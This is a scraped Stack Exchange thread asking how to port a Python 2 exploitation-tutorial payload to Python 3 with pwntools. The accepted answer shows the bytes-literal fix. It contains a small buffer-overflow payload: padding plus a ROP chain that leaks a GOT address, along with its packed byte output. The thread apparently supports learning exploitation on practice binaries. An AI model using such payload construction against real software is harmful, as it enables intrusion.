{
  "title": "What is the right way to pack a payload with Python3's pwntools",
  "link": "https://reverseengineering.stackexchange.com/questions/19776/what-is-the-right-way-to-pack-a-payload-with-python3s-pwntools",
  "content": "On the tutorial by Megabeets, \"A journey into Radare 2 â€“ Part 2: Exploitation\", he shows an example of how to create a payload with Python2\n\n```\n# Initial payload\npayload  =  \"A\"*140 # padding\nropchain =  p32(puts_plt)\nropchain += p32(entry_point)\nropchain += p32(puts_got)\n\npayload = payload + ropchain\n\n```\nHow would that get ported to Python3? p32 is a 32bit integer. Python3 uses bytes() instead of strings. What's the right way to do this? \n\npython3-pwntools's docs show that there are some payload helpers. But, I couldn't get them to work. Worse yet, those helpers were available in Python2 as well, but not used (not sure why).\n\nHow would I write Megabeet's example using python3-pwntools?\n\n",
  "votes": "1",
  "answers": 1,
  "views": "13k",
  "tags": [
    "python",
    "pwntools"
  ],
  "user": "Evan Carroll",
  "time": "Oct 31, 2018 at 23:32",
  "comments": [
    {
      "user": "cfernandezlinux",
      "text": "Thank you was looking for 1-2 hours about this. usually I do all my stuff on ruby/C/GO but was following an example that uses pwntools so was ignorant about this b'a'*100 etc switch was trying with str() but broke pwntools",
      "time": null
    }
  ],
  "answers_data": [
    {
      "content": "Actually, this is a programming question and not an RE question. Anyway, you simply need to tell python to treat your payload as bytes by adding the bytes-literal b before the 'A'*140.\n\n```\n>>> from pwn import *\n>>>\n>>> puts_plt = 0x8048390\n>>> puts_got = 0x804a014\n>>> entry_point = 0x80483d0\n>>>\n>>> payload  =  b'A' * 40   # Only 40 for the example\n>>> ropchain =  p32(puts_plt)\n>>> ropchain += p32(entry_point)\n>>> ropchain += p32(puts_got)\n>>>\n>>> payload = payload + ropchain\n>>>\n>>> print(payload)\nb'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x90\\x83\\x04\\x08\\xd0\\x83\\x04\\x08\\x14\\xa0\\x04\\x08'\n>>>\n\n```\nFor further reading, you can read the String and Bytes literals page in the Python3 documentation.\n\n",
      "votes": "2",
      "user": "Megabeets",
      "time": "Nov 1, 2018 at 9:38",
      "is_accepted": true,
      "comments": [
        {
          "user": "Evan Carroll",
          "text": "I tried this but it didn't work with your script, so I was wondering if there was more to it in python3 as I'm fairly certain I got the variables at the top correct (see this for follow up reverseengineering.stackexchange.com/q/19784/22669). I wasn't sure if it was as simple as using the bit literals, or if I was supposed to use the payload formatter in pwntools.",
          "time": null
        }
      ]
    }
  ]
}